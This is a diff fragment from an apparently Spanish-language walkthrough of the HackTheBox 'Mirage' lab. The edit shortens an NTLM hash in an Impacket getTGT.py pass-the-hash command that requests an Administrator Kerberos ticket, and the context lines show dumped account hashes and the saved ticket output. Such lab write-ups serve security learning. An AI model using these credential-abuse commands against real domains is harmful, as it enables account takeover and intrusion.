@@ -1202,7 +1202,8 @@ Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:edb5e64a04fe919e5c3fa6bfbf
 Ya con todos los hashes NTLM, podemos simplemente solicitar un TGT como `Administrator`
 
 ~~~ bash
-getTGT.py mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip dc01.mirage.htb 
+getTGT.py mirage.htb/Administrator -hashes :7be... -dc-ip dc01.mirage.htb
+
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in Administrator.ccache
